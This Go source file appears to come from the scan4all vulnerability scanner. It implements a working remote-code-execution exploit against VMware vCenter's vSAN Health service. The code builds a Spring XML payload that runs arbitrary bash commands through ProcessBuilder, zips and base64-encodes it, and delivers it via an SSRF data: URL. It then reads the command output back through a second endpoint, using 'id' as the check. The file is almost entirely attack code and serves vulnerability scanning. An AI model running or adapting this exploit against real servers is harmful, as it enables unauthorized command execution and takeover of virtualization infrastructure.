package vCenter

import (
	"archive/zip"
	"bytes"
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"io"
	"log"
	"net/http"
	"strings"
	"time"
)

func Upload(szUrl, b64_str string) {
	szUrl = util.GetUrlHost(szUrl)
	ssrf_url := strings.Replace("https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,qq%23", "qq", b64_str, -1)
	tarGet := szUrl + "/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
	jsonText := fmt.Sprintf("{\"methodInput\":[[\"%s\"]]}", ssrf_url)
	util.SendData2Url(tarGet, jsonText, &map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
		"Content-Type": "application/json;charset=UTF-8",
	}, func(resp *http.Response, err error, szU string) {
		if nil != resp {
			io.Copy(io.Discard, resp.Body)
			if resp.StatusCode == 200 {
				fmt.Println("[+] 上传成功，开始命令执行.")
			}
		}
	})
}
func Execute(szUrl string) string {
	szUrl = util.GetUrlHost(szUrl)
	tarGet := szUrl + "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty"
	jsonText := "{\"methodInput\":" + " [" + "\"output\", null" + "]}"
	szRst := ""
	util.SendData2Url(tarGet, jsonText, &map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
		"Content-Type": "application/json;charset=UTF-8",
	}, func(resp *http.Response, err error, szU string) {
		if nil != resp {
			if data, err := io.ReadAll(resp.Body); nil != err {
				s1 := strings.Replace(string(data), "\\n", "\n", -1)
				if strings.Contains(s1, "uid=") && strings.Contains(s1, "gid=") {
					szRst = szU
				}
				log.Println(s1)
			}
		}
	})
	return szRst
}

func Generate_xml(command string) []byte {
	con := `<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[ {cmd} 2>&1 ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="system" class="java.lang.System">
        <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;
&quot;))) }"/>
    </bean>
</beans>`
	xml_str := strings.Replace(con, "{cmd}", command, -1)
	//// fmt.Println(xml_str)
	//ioutil.WriteFile("offline_bundle.xml", []byte(xml_str), 0666)

	return []byte(xml_str)
}

func Zip_file(src string, xml_buf []byte) []byte {
	var buf bytes.Buffer
	zipWriter := zip.NewWriter(&buf) //初始化一个zip.Writer，用来将数据写入zip文件中
	w2, err := zipWriter.Create(src) //创建一个io.Writer
	if err != nil {
		log.Println(err)
		return nil
	}

	w2.Write(xml_buf)
	zipWriter.Close()
	return buf.Bytes()
}

func CheckVul002(szUrl string) (string, bool) {
	t1 := Generate_xml(`id`)
	t2 := Zip_file("offline_bundle.xml", t1)
	t3 := util.To_b64(t2)
	Upload(szUrl, t3)
	time.Sleep(1)
	szRst := Execute(szUrl)
	return szRst, "" != szRst
}
